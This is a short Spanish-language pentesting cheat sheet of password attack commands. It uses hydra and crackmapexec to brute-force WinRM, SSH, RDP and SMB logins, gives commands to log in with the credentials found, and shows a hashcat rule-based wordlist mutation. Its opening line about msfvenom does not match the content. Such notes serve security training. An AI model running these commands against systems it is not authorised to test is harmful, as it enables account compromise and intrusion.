# Password Attacks o Ataques de Contraseña
## Descripción
MSFVENOM es una herramienta que viene integrada en metasploit framework que sirve principalmente para crear payloads, podemos ver algunos ejemplos con enconders para darle algo mas de sabor.

### WinRM (5985 HTTP y 5986 HTTPS)
```python
crackmapexec winrm IP -u user.list -p password.list
evil-winrm -i IP -u user -p password (tenemos credenciales arriba y esto es para hacer login)
```
### SSH (22)
```python
hydra -L user.list -P password.list ssh://IP
ssh user@IP (para ganar acceso al sistema con las credenciales descubiertas)
```
### RDP (3389)
```python
hydra -L user.list -P password.list rdp://IP
xfreerdp /v:IP /u:user /p:password (para ganar acceso al sistema con las credenciales descubiertas)
```
### SMB (445)
```python
hydra -L user.list -P password.list smb://IP
crackmapexec smb IP -u "user" -p "password" --shares
smbclient -U user \\\\IP\\SHARENAME
```

### Generar lista de palabras basada en reglas
```python
hashcat --force password.list -r custom.rule(este arribo debes de elaborar tu regla) --stdout | sort -u > mut_password.list
```
